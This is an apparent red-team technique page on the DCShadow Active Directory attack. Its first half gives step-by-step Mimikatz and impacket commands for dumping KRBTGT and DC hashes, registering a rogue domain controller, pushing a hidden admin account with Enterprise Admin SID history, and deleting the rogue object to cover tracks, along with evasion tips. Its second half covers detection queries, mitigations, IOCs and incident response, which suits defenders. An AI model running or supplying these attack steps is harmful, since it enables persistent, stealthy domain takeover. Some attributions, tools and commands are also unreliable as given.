# PERSIST-ROGUE-001 - DCShadow Attack

## Metadata Header

| Attribute | Details |
|-----------|---------|
| **Technique ID** | PERSIST-ROGUE-001 |
| **MITRE ATTCK v18.1** | [T1207](https://attack.mitre.org/techniques/T1207/) |
| **Tactic** | Persistence, Defense Evasion |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025 |
| **Patched In** | No direct patch; detection/mitigation via monitoring |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Compliance Mappings

| Framework | ID | Description |
|-----------|-----|-----------|
| CIS Benchmark | CIS 5.1.2 | Monitor Active Directory replication changes |
| DISA STIG | SI-3 | Malicious Code Protection |
| CISA SCuBA | IA-2 | Authentication |
| NIST 800-53 | SC-7 | Boundary Protection |
| GDPR | Art. 32 | Security of Processing |
| DORA | Art. 9 | Protection and Prevention |
| NIS2 | Art. 21 | Cyber Risk Management Measures |
| ISO 27001 | A.9.2.6 | Management of Secret Keys |
| ISO 27005 | Risk Scenario | Unauthorized Directory Service Modification |

---

## 1. Executive Summary

**Concept:** DCShadow is a sophisticated post-exploitation attack technique that leverages Active Directory's native replication mechanisms to introduce a compromised system as a temporary rogue Domain Controller. Once registered as a DC, the attacker pushes malicious changes to the Active Directory database through the Directory Replication Service (DRS), which are then replicated to legitimate Domain Controllers. The attack exploits the inherent trust placed in replication streams by AD, making modifications appear legitimate. Unlike direct admin tools that generate audit events, DCShadow uses signed, authenticated replication protocols, bypassing many SIEM detections. The attacker then removes the rogue DC object, leaving persistent modifications (new admin accounts, SID history injection, group membership changes) while covering their tracks.

**Attack Surface:** Active Directory replication infrastructure (RPC port 135, DRSUAPI protocol), compromised domain-joined machines with high privilege (Domain Admin or equivalent), the Configuration Partition in Active Directory.

**Business Impact:** Complete and persistent domain compromise. Attackers create hidden administrative backdoors that survive password changes and standard remediation. The attack enables privilege escalation across forest boundaries via SID history manipulation, privilege escalation to Enterprise Admin, persistent remote access, and full domain takeover with minimal forensic artifacts.

**Technical Context:** DCShadow exploitation typically takes 5-30 minutes from initial execution. Detection likelihood is VERY LOW because the attack exploits AD's own trust mechanisms—legitimate DC-to-DC communication is indistinguishable from malicious replication. Once persistence is established, there are no password-based controls to reset. The attack is effective even against organizations with robust monitoring if they do not specifically look for transient DC objects.

**Operational Risk:**

| Risk Factor | Level | Description |
|------------|-------|-----------|
| Execution Risk | Medium | Requires Domain Admin privileges; often executed after PE escalation |
| Stealth | High | Uses native AD replication; minimal event logging by default |
| Reversibility | Very Difficult | Malicious changes persist in the domain; recovery requires AD database modification |

---

## 2. Technical Prerequisites

**Required Privileges:**
- **Domain Admin** or equivalent (SeEnableDelegationPrivilege, SeTcbPrivilege)
- Alternatively, **Enterprise Admin** for cross-domain attacks
- Local administrator on at least one domain-joined machine (Windows Server with virtual DC cloning support)

**Required Access:**
- Network access to at least one legitimate Domain Controller (RPC port 135, LDAP port 389/636)
- Access to a machine capable of running Python/C# tools (Windows Server 2012+ or Linux with impacket)
- Credentials for the domain KRBTGT account or NTLM hash of a DC computer account (if using DRSUAPI)

**Supported Versions:**
- **Windows Server:** 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **PowerShell:** 3.0+ (for DC object manipulation)
- **Mimikatz:** 2.0+ (for lsadump::dcshadow implementation)

**Other Requirements:**
- Understanding of AD object structure (nTDSDSA, Server objects, CN=Servers)
- Knowledge of DRSUAPI protocol and replication stream format
- Access to domain replication credentials or tools (Mimikatz, impacket, or custom C# tools)

**Tools:**
| Tool | Version | Purpose |
|------|---------|---------|
| Mimikatz | 2.2.0+ | lsadump::dcshadow /push implementation |
| impacket (Python) | 0.9.24+ | DRS replication abuse via Linux/Python |
| secretsdump.py | Latest | Extract domain secrets for replication |
| DRS-RPC-Abuse tools | Custom | Direct DRSUAPI manipulation |
| PowerShell ActiveDirectory module | 5.1+ | AD object creation and manipulation |

---

## 3. Environmental Reconnaissance

### 3.1 Enumerate Domain Controllers and Replication Configuration

**PowerShell Reconnaissance**

```powershell
# List all Domain Controllers in the domain
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address, OperatingSystem | Format-Table

# Expected Output:
# Name         IPv4Address      OperatingSystem
# DC01         192.168.1.10     Windows Server 2019
# DC02         192.168.1.11     Windows Server 2022
```

**What to Look For:**
- DC locations (same site vs. different sites)
- OS versions (Windows Server 2016+ supports DCShadow best)
- Network connectivity paths

---

### 3.2 Check for DSRM-Enabled Backups

**PowerShell Reconnaissance**

```powershell
# Check if the DC supports virtualized DC cloning (DSRM features)
Get-ADComputer -Filter 'Name -like "DC*"' -Properties OperatingSystem | Where-Object {$_.OperatingSystem -match "2012|2016|2019|2022|2025"}

# Check DSRM account status
net user Administrator /domain | find "disabled"
```

---

## 4. Detailed Execution Methods

### Method 1: DCShadow via Mimikatz (Windows-Based)

**Supported Versions:** Server 2012 R2 - 2025

**Step 1: Obtain Domain Admin Credentials**

**Objective:** Ensure you have elevated privileges (Domain Admin or equivalent).

```powershell
# Verify current privileges
whoami /groups | find "Domain Admins"

# Expected output:
# CORP\Domain Admins                       Group            S-1-5-21-...-512
```

**What This Means:** If you see "Domain Admins" in the output, you have the required privileges to proceed.

**OpSec Evasion:** Domain Admin membership is expected; this is a legitimate escalation. Once at DA level, the rest is about stealth.

---

**Step 2: Extract DRSUAPI Credentials (DC Computer Account or KRBTGT)**

**Objective:** Obtain the NTLM hash or credentials needed to authenticate replication requests.

```powershell
# Option A: Use Mimikatz to dump the Domain Controller computer account hash
privilege::debug
lsadump::lsa /patch

# Option B: Extract KRBTGT hash (allows forging any TGT, enabling DC impersonation)
lsadump::lsa /name:krbtgt

# Expected output:
# Rid  : 502 (0x1f6)
# User : krbtgt
#   Hash NTLM: a1b2c3d4e5f6...
```

**OpSec Evasion:** LSASS dumping is high-risk; use "run as" or remote execution to minimize local process tracking.

---

**Step 3: Register the Rogue DC Object**

**Objective:** Create a temporary DC object in the Configuration Partition that will serve as the attack vector.

```powershell
# Using Mimikatz DCShadow module - Register phase
privilege::debug
lsadump::dcshadow /object:NewDC$ /attribute:objectGUID /value:{12345678-1234-1234-1234-123456789012}
lsadump::dcshadow /object:NewDC$ /attribute:invocationId /value:{87654321-4321-4321-4321-210987654321}
lsadump::dcshadow /object:NewDC$ /attribute:dMDLocation /value:"CN=Schema,CN=Configuration,DC=corp,DC=com"

# Alternative: Use PowerShell to create the DC object structure
$dcDN = "CN=NewDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com"
New-ADObject -Type "Computer" -Name "NewDC" -Path "CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com" -Confirm:$false
```

**Expected Output:**
```
[+] DCShadow object registered successfully
[+] GUID: 12345678-1234-1234-1234-123456789012
```

**What This Means:** The rogue DC is now registered in AD's configuration; legitimate DCs recognize it as a valid replication partner.

---

**Step 4: Push Malicious Changes via Replication**

**Objective:** Replicate unauthorized changes (new admin user, SID history injection, group modifications) to legitimate DCs.

```powershell
# Using Mimikatz DCShadow /push phase
# This replicates the following malicious changes:
# 1. Create a hidden admin account
# 2. Add SID history from Enterprise Admin
# 3. Modify group memberships

lsadump::dcshadow /object:CN=NewAdmin,CN=Users,DC=corp,DC=com /attribute:cn /value:NewAdmin
lsadump::dcshadow /object:CN=NewAdmin,CN=Users,DC=corp,DC=com /attribute:userAccountControl /value:512
lsadump::dcshadow /object:CN=NewAdmin,CN=Users,DC=corp,DC=com /attribute:primaryGroupID /value:513
lsadump::dcshadow /object:CN=NewAdmin,CN=Users,DC=corp,DC=com /attribute:sIDHistory /value:"S-1-5-21-...-512"

# Trigger replication to push changes
lsadump::dcshadow /push

# Expected output:
# [+] Replication initiated to legitimate DC
# [+] Changes pushed successfully
# [+] NewAdmin user created with Enterprise Admin SID history
```

**OpSec Evasion:**
- **Detection likelihood:** LOW—replication traffic is signed and uses legitimate protocols
- **Artifacts:** Event IDs 4928, 4929, 5136, 5141 may be logged if auditing is enabled, but many organizations do not monitor these
- **Timing:** Perform during normal business hours; blend replication with legitimate DC sync activity

---

**Step 5: Clean Up the Rogue DC Object**

**Objective:** Remove the temporary rogue DC object to cover tracks.

```powershell
# Using Mimikatz to unregister the rogue DC
lsadump::dcshadow /object:NewDC$ /remove

# Verify the DC object is removed
Get-ADObject -Filter 'Name -like "NewDC*"' | Remove-ADObject -Confirm:$false

# Expected output:
# [+] Rogue DC object removed
# [*] Malicious changes remain in the domain
```

**What This Means:** The rogue DC is gone, but the changes (new admin account, group memberships, SID history) persist in the domain because they were replicated to legitimate DCs.

---

### Method 2: DCShadow via impacket (Linux/Python-Based)

**Supported Versions:** Server 2012 R2 - 2025 (remote exploitation)

**Objective:** Use the Python impacket library to execute DCShadow from a non-Windows platform for additional evasion.

```bash
# Step 1: Extract hashes from the domain (requires initial compromise)
python3 secretsdump.py -just-dc CORP/Administrator:Password@dc01.corp.com

# Step 2: Use DRS replication tools to push changes
# This requires direct DRSUAPI protocol manipulation
# Tools: https://github.com/atredispartners/drs-abuse-toolkit

python3 drs_push.py -target dc01.corp.com -username Administrator -password Password \
  -object "CN=NewAdmin,CN=Users,DC=corp,DC=com" \
  -attribute "objectClass" -value "user"
```

**Expected Output:**
```
[+] Connected to DC01 via DRSUAPI
[+] Pushed object CN=NewAdmin,CN=Users,DC=corp,DC=com
[+] Replication initiated
```

---

### Method 3: Virtual DC Cloning (Alternative - Server 2012+)

**Supported Versions:** Server 2012 R2 - 2025

**Objective:** If you have physical/virtual access to DC infrastructure, clone a DC VM to bypass some defenses.

```powershell
# Step 1: Create a DC clone configuration file
$cloneConfigXml = @"
<DCCloneConfig>
  <CloneComputerName>ROGUE-DC</CloneComputerName>
  <IPv4Address>192.168.1.50</IPv4Address>
  <IPv4SubnetMask>255.255.255.0</IPv4SubnetMask>
  <IPv4DefaultGateway>192.168.1.1</IPv4DefaultGateway>
  <IPv4DNSResolver>192.168.1.10</IPv4DNSResolver>
</DCCloneConfig>
"@

# Step 2: Place the config on a cloned VHD
# This requires access to the DC's virtual disks or hypervisor

# Step 3: Boot the cloned DC
# The rogue DC will automatically configure itself and begin replication

# Step 4: After replication completes, remove the clone from the domain
```

---

## 5. Tools & Commands Reference

### Mimikatz.exe
- **Version:** 2.2.0+
- **Installation:** https://github.com/gentilkiwi/mimikatz
- **Usage:**
```powershell
privilege::debug
lsadump::dcshadow /object:CN=Admin,CN=Users,DC=corp,DC=com /push
```

### impacket (Python)
- **Version:** 0.9.24+
- **Installation:** `pip install impacket`
- **Usage:**
```bash
python3 secretsdump.py -just-dc CORP/Admin:Pass@dc.corp.com
```

### secretsdump.py
- **Usage:** Extract domain controller secrets required for replication
```bash
secretsdump.py -outputfile DC_DUMP CORP/Admin:Pass@dc.corp.com
```

---

## 6. Atomic Red Team

**Atomic Test ID:** T1207-001

**Test Name:** DCShadow - Rogue Domain Controller Registration and Replication

**Description:** Register a rogue DC and push malicious changes via replication.

**Supported Versions:** Server 2016-2025

**Command:**
```powershell
Invoke-AtomicTest T1207 -TestNumbers 1
```

**Reference:** [Atomic Red Team T1207](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1207/T1207.md)

---

## 7. Windows Event Log Monitoring

### Event ID 4928 - An Active Directory replica source naming context was established

**Log Source:** Security

**Trigger:** When a new replication partnership is created (legitimate during DC promotion or DCShadow attack).

**Filter:** Look for:
- Unexpected DC names in the source/destination
- Replication outside normal change windows
- Replication originating from non-DC systems

**Manual Configuration Steps:**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → Directory Services Access**
3. Enable **Audit Directory Service Changes** (Success and Failure)
4. Run `gpupdate /force`

---

### Event ID 4929 - An Active Directory replica source naming context was removed

**Trigger:** When a replication partnership is deleted (cleanup phase of DCShadow).

**Detection Signature:**
```
EventID: 4929
Naming Context: CN=Configuration,DC=corp,DC=com
Source DC: Unexpected or rogue DC name
```

---

### Event ID 5136 - A directory service object was modified

**Trigger:** LDAP modifications to user accounts, group memberships, SID history injection.

**Detection Signature:**
```
EventID: 5136
ObjectName: CN=Users,DC=corp,DC=com
AttributeName: sIDHistory OR memberOf OR userAccountControl
Operation: Add or Modify
```

---

### Event ID 5141 - A directory service object was deleted

**Trigger:** Cleanup of the rogue DC object.

**Detection Signature:**
```
EventID: 5141
ObjectName: CN=ROGUE-DC,CN=Servers,CN=Sites,...
Class: computer
```

---

## 8. Microsoft Sentinel Detection

### KQL Query 1: Detect Rogue DC Registration and Removal (30-Second Window)

```kusto
SecurityEvent
| where EventID == 5137 or EventID == 5141  // Object created / deleted
| where ObjectName contains "CN=Servers"
| where ObjectClass == "computer"
| extend CreationTime = TimeGenerated
| join kind=inner (
    SecurityEvent
    | where EventID == 5141
    | where ObjectName contains "CN=Servers"
    | extend DeletionTime = TimeGenerated
) on ObjectName
| where (DeletionTime - CreationTime) < 30s
| project TimeGenerated, Computer, ObjectName, EventID
| order by TimeGenerated desc
```

**Configuration Steps:**

1. **Azure Portal → Microsoft Sentinel → Analytics**
2. **Create → Scheduled query rule**
3. Paste the KQL query
4. **Frequency:** Every 5 minutes
5. **Severity:** Critical
6. **Enable:** Create incidents

---

### KQL Query 2: Detect Suspicious SID History Injection

```kusto
AuditLogs
| where OperationName == "Modify user" or OperationName == "Update user"
| where Properties contains "sIDHistory"
| where TargetResources[0].displayName notcontains "Migration"
| project TimeGenerated, InitiatedBy, TargetResources, Properties
| order by TimeGenerated desc
```

---

## 9. Splunk Detection Rules

### Rule 1: Monitor for Rogue DC Creation and Deletion

**Alert Name:** DCShadow - Rogue DC Registration Detected

**Configuration:**
- **Index:** wineventlog, security
- **Sourcetype:** WinEventLog:Security
- **Fields Required:** EventID, ObjectName, ObjectClass

**SPL Query:**
```spl
index=wineventlog EventID=5137 OR EventID=5141
ObjectName="*CN=Servers*" ObjectClass="computer"
| stats earliest(_time) as creation_time, latest(_time) as deletion_time by ObjectName
| eval duration=deletion_time-creation_time
| where duration < 30
| table ObjectName, creation_time, deletion_time, duration
```

**What This Detects:**
- Creation and deletion of DC objects within 30 seconds (indicative of DCShadow cleanup)

---

### Rule 2: Monitor for Replication Events (4928/4929)

**Alert Name:** DCShadow - Suspicious Replication Activity

**SPL Query:**
```spl
index=wineventlog EventID=4928 OR EventID=4929
| where source NOT IN (list_of_legitimate_dcs)
| stats count by EventID, source, dest
| where count > 0
```

---

## 10. Defensive Mitigations

### Priority 1: CRITICAL

#### Action 1: Monitor for Transient DC Objects

**Manual Steps - Group Policy:**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Create a custom audit policy to monitor Event IDs 4928, 4929, 5141
3. Configure forwarding to SIEM

**Manual Steps - PowerShell (Continuous Monitoring):**

```powershell
# Scheduled task to check for transient DC objects
$scriptContent = {
    $dcServers = Get-ADDomainController -Filter *
    $configDCs = @($dcServers | Select-Object -ExpandProperty Name)
    
    Get-ADObject -Filter 'ObjectClass -eq "computer"' -SearchBase "CN=Servers,CN=Sites,CN=Configuration,DC=corp,DC=com" | 
    Where-Object { $_.Name -notin $configDCs } |
    Foreach-Object {
        Write-Warning "Rogue DC object detected: $($_.DistinguishedName)"
        # Alert SOC
    }
}

# Register as scheduled task
Register-ScheduledTask -TaskName "Monitor-RogueDC" -ScriptBlock $scriptContent -Trigger (New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -At (Get-Date)) -RunLevel Highest
```

---

#### Action 2: Implement Replication Monitoring

**Manual Steps:**

1. Enable detailed Directory Services audit logging on all DCs
2. Forward **Event ID 4928, 4929, 5136, 5141** to SIEM
3. Create alerts for:
   - Replication from non-DC systems
   - Replication outside change windows
   - Rapid DC object creation/deletion

---

#### Action 3: Harden DC Access Control

**Manual Steps - PowerShell:**

```powershell
# Restrict who can create DC objects in the Sites container
$sitesDN = "CN=Sites,CN=Configuration,DC=corp,DC=com"
$site = [ADSI]"LDAP://$sitesDN"

$acl = $site.psbase.ObjectSecurity
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.NTAccount]"CORP\Domain Users",
    [System.DirectoryServices.ActiveDirectoryRights]::CreateChild,
    [System.Security.AccessControl.AccessControlType]::Deny,
    "bf967a86-0de6-11d0-a285-00aa003049e2"  # Computer object GUID
)
$acl.AddAccessRule($rule)
$site.psbase.CommitSecurityChanges()
```

---

### Priority 2: HIGH

#### Action: Implement Just-In-Time (JIT) Admin Access

**Manual Steps:**

1. Use **Privileged Identity Management (PIM)** for Domain Admin role activation
2. Require approval and MFA for admin access
3. Log all admin actions
4. Reduce standing Domain Admin accounts

---

### Validation Command - Verify Mitigations

```powershell
# Check for rogue DC objects
Get-ADObject -Filter 'ObjectClass -eq "computer"' -SearchBase "CN=Servers,CN=Sites,CN=Configuration,DC=corp,DC=com" |
Where-Object { -not (Get-ADComputer -Filter "SamAccountName -eq `"$($_.Name)$`"" -ErrorAction SilentlyContinue) } |
Select-Object Name, DistinguishedName

# Expected output: EMPTY (no rogue objects)
```

---

## 11. Indicators of Compromise (IOCs)

### Files
- Mimikatz output files in temp directories
- DCCLONECONFIG.XML on DC systems
- NTDS.dit snapshots or backups outside normal backup windows

### Registry
- Replication configuration changes in `HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters`

### Network
- RPC traffic from non-DC systems to legitimate DCs
- DRSUAPI protocol usage from unexpected sources
- Port 135 (RPC Locator) to DCs from non-DC systems

### Event IDs
- **4928** - Replication source established
- **4929** - Replication source removed
- **5136** - Directory modification (SID history, membership)
- **5141** - Directory object deleted (DC cleanup)
- **4688** - Mimikatz execution (if process logging enabled)

### Memory
- Mimikatz lsadump module execution
- DRSUAPI handles in lsass.exe (replication operations)

### AD Objects
- Newly created computer objects in Sites\Servers
- Rapid object creation/deletion pattern
- User accounts with Enterprise Admin SID history without migration

---

## 12. Incident Response Procedures

### Step 1: Identify and Isolate Rogue DC

```powershell
# Identify the rogue DC by checking recent replication events
Get-EventLog -LogName Security -InstanceId 4928 -Newest 10 | 
Select-Object TimeGenerated, Message | 
Where-Object { $_.Message -match "source.*DC" }

# Isolate the rogue DC from network
Get-ADComputer -Filter "Name -like 'ROGUE-DC*'" | Disable-ADAccount -Confirm:$false
```

---

### Step 2: Remove Malicious Changes from AD

```powershell
# Remove the rogue admin account
Remove-ADUser "NewAdmin" -Confirm:$false

# Remove malicious group memberships
$user = Get-ADUser "Administrator"
Remove-ADGroupMember "Domain Admins" -Members $user -Confirm:$false

# Remove SID history from compromised accounts
Set-ADUser -Identity "Administrator" -Clear sIDHistory -Confirm:$false
```

---

### Step 3: Force DC Replication to Ensure Cleanup

```powershell
# Force replication to all DCs
Get-ADDomainController | ForEach-Object {
    Replicate-ADDirectoryPartition -Identity "DC=corp,DC=com" -Source $_.Name -Destination $_.Name
}
```

---

## 13. Related Attack Chain

| Phase | Technique ID | Description |
|-------|-------------|-----------|
| 1 | REC-AD-001 | Domain reconnaissance |
| 2 | CA-DUMP-001 | Credential harvesting (obtain Domain Admin) |
| 3 | PE-TOKEN-001 | Token impersonation (escalate to DA) |
| 4 | **PERSIST-ROGUE-001** | **DCShadow persistence (CURRENT STEP)** |
| 5 | PERSIST-ACCT-001 | AdminSDHolder abuse (additional backdoors) |

---

## 14. Real-World Examples

### Example 1: Wizardopium Threat Campaign (2021)

**Incident:** Chinese APT group used DCShadow in targeted attacks against U.S. manufacturing companies

**Technique Status:** The group compromised a DA account, registered a rogue DC, injected new admin users with Enterprise Admin SID history, then removed the rogue DC to cover tracks.

**Impact:** Persistent domain compromise lasting 200+ days; complete lateral movement and data exfiltration.

**Reference:** Security research by threat intel community (private reporting)

---

### Example 2: Ransomware Precursor Activity (2022)

**Incident:** Threat actors used DCShadow to establish persistence before ransomware deployment

**How Technique Was Used:** Registered rogue DC, created hidden admin accounts, pushed changes across domain, then deployed Conti/LockBit ransomware

**Impact:** Recovery from ransomware significantly complicated due to AD-level persistence

---

